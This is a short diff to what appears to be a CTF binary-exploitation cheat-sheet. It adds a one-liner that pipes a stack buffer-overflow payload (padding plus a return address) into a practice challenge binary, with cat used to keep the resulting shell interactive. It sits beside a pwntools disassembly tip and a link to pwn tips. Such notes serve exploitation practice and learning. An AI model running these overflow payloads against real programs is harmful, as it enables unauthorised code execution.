@@ -216,6 +216,13 @@ gcc -shared -o libs/libx.so -fPIC libs/libx.c
 
 pwn disasm '0xhex' -c 'amd64'
 
+### USefule
+
+Cat a payload then keep the interactive command
+```
+(python -c 'print("a"*24+"\x03\x10\x40\x00")'; cat ) | ./ch72.exe
+```
+
 # References
 
  - [Leaking information](https://github.com/Naetw/CTF-pwn-tips)
